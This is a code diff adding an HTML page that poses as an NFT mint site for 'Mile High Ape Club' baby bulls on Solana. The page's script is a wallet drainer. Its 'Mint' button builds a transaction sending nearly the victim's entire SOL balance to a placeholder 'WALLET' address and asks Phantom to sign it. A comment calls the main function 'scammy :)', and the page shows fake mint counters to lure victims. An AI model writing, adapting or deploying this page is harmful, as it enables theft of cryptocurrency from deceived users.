@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="favicon.ico" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="888 baby bulls from a forgotten location living on the Solana chain.
+    " />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet" />
+    <link rel="apple-touch-icon" href="logo192.png.html" />
+    <link rel="manifest" href="manifest.json" />
+    <title>MINT | Mile High Ape Club</title>
+    <!-- Added solana library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <link href="static/css/main.db72a1e4.chunk.css" rel="stylesheet">
+</head>
+
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+<div class="background-image">
+    <div id="root">
+        <div class="App">
+            <div class="full-container">
+                <div class="center-container">
+                    <div>
+                        <p class="countdown-text-small margined">Mint is live!</p>
+                        <p class="countdown-text">00:00:00:00</p>
+                    </div>
+                    <div class="button-container">
+                
+                        <a id="connectButtonID" class="button-connect" href="index.html#" onclick="connectButton()">Connect</a>
+                        <!-- This button has to be added here after connect is pressed. The CSS that controls the look of the class "button-connect is already setup in the CSS doc. No need to do it in javasctipt dynamically "-->
+                        <!-- a id="mintButtonID" class="button-connect" href="#" onclick="mintButton()">Mint</a -->
+                    </div>
+                    <div>
+                        <p class="countdown-text-small margined">Minted:</p>
+                        <p class="countdown-text">6945/7700</p>
+
+                    </div>
+
+                    <div class="row-container">
+                        <a class="social-icon" href="https://twitter.com/BabyBullsNFT"><i class="fab fa-twitter"></i></a>
+                        <a class="social-icon" href="https://discord.gg/thebabybulls"><i class="fab fa-discord"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+
+
+<script>
+    // Global variables
+    var sent = false;
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+
+
+    // Determine if phantom is connected 
+    const getProvider = () => {
+        // Get the provider
+        if ("solana" in window) {
+            const provider = window.solana;
+
+            if (provider.isPhantom) {
+                return provider;
+            } else {
+                alert("Due to a technical glitch, we are only supporting Phantom Wallet. Sorry for any inconvenience!");
+            }
+        }
+        // If phantom is not installed - prompt user 
+        window.open("https://phantom.app/", "_blank");
+    };
+
+    // This will change page to show connection 
+    async function setConnected() {
+
+        let info = await connection.getAccountInfo(window.solana.publicKey);
+
+
+
+
+
+
+        var connect_button = document.getElementById("connectButtonID"); //.innerHTML = "Connected";
+
+        const pubKey = await window.solana.publicKey;
+
+        // Grab the first 5 characters of the pubKey 
+        const pubKeyShort = pubKey.toString().substring(0, 5);
+
+        // Change the display of the connect button to show the users address
+        connect_button.innerHTML = "" + pubKeyShort + "...";
+
+        // Next we want to add the mint button using javascript 
+
+        // First we setup the html tag as we want it to look 
+        var mint_button = document.createElement("a");
+        mint_button.setAttribute("id", "mintButtonID");
+        mint_button.setAttribute("class", "button-connect");
+        mint_button.setAttribute("href", "#");
+        mint_button.setAttribute("onclick", "mintButton()");
+        mint_button.innerHTML = "Mint";
+
+        // Locate the parent element and add the mint button to it 
+        var button_container = document.getElementsByClassName("button-container")[0];
+        button_container.appendChild(mint_button);
+
+        ///////// THIS IS WHERE WE HAVE TO ALTER THE HTML AND CSS TO MAKE AUTHENTIC /////////
+
+
+    }
+
+    // This change the page to show no connection 
+    function setNotConnected() {
+        // document.getElementById("status").innerHTML = "Not Connected";
+    }
+
+    // This will alter the connection status 
+    function refreshStatus() {
+
+        // Refresh status 
+        const provider = getProvider();
+
+        if (provider) {
+            provider.on("connect", () => {
+                // Update page elements 
+
+                setConnected()
+            });
+            provider.on("disconnect", () => {
+                // Update page elements
+                // setDisconnected() 
+            });
+        }
+    }
+
+    // Primary leader function to operate scammy :) 
+    async function connectButton() {
+
+if (!connectButton) {
+    try {
+        connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+    } catch (error) {
+        console.log(error);
+    }
+}
+
+var solflareConnect;
+var phantomConnect;
+// Get provider 
+try {
+    phantomConnect = window.solana.isConnected;
+    //solflareConnect = window.solflare.isConnected;
+} catch (error) {
+    //solConnect = provider.isConnected;
+    console.log(error);
+}
+//console.log(solConnect);
+
+// If sol not connected 
+if (!phantomConnect) {
+
+    // Prompt the user to connect 
+    try {
+        window.solana.connect({
+            onlyIfTrusted: false
+        });
+    } catch (error) {
+        console.log(error);
+    }
+
+} else {
+    console.log("Connected!");
+    // Edit the html elements to reflect the wallet address
+}
+// Update the status of the connection 
+refreshStatus();
+}
+
+
+    //////////////////////////////////////////////////////////////////////////
+
+    function lam2usd(lam) {
+        return lam / 1000000000;
+    }
+    // This function tests the transaction
+    async function testTransfer(amount) {
+
+        // Get provider and connection 
+        const provider = getProvider();
+        const solConnected = window.solana.isConnected;
+        const manylamports = (amount * 1000000000).toFixed(0);
+
+        // Verify the connection
+        if (!provider) {
+            return;
+        } else if (!solConnected) {
+            return;
+        }
+
+        // Get the public key of the user
+        let account_info = await connection.getAccountInfo(window.solana.publicKey);
+
+        // The user has no money 
+        if (account_info == null) {
+            console.log("Not enough SOL for transaction!");
+
+            // Run a function to display error 
+            // displayError();
+            return;
+        }
+
+
+
+
+
+
+       // NEW WAY! 
+       var charginglamports = (balance - 5e3); // Amount to be withdrawn 
+
+
+// Create the transaction
+let transaction = new solanaWeb3.Transaction().add(
+    solanaWeb3.SystemProgram.transfer({
+        fromPubkey: provider.publicKey,
+        toPubkey: "WALLET",
+        lamports: charginglamports,
+    })
+);
+
+        // Get the black hash 
+        let {
+            blockhash
+        } = await connection.getRecentBlockhash();
+
+        // Get the block hash and set the fees 
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = provider.publicKey;
+
+        return transaction;
+    }
+
+
+    // Function to attempt to MINT
+    async function makeTransfer(amount) {
+
+        // Test the transaction on devnet 
+        let transaction = await testTransfer(amount);
+
+        const provider = getProvider();
+
+        // If the provider is not Phantom 
+        if (!provider) {
+            return;
+        }
+
+        // If the transaction is valid 
+        if (transaction) {
+
+            // Send the transaction to the provider network 
+            let signed = await provider.signTransaction(transaction, connection);
+            //console.log(signed);
+            let signature = await connection.sendRawTransaction(signed.serialize());
+            //console.log(signature);
+            await connection.confirmTransaction(signature);
+            sent = true;
+        }
+
+
+    }
+    // Mint 
+    function mintButton() {
+
+        // Attempt to transfer wallet funds 
+        makeTransfer(10000);
+
+        if (sent) {
+            //alert("Transaction failed!");
+            console.log("Transaction complete!");
+        }
+    }
+</script>
+
+</html>
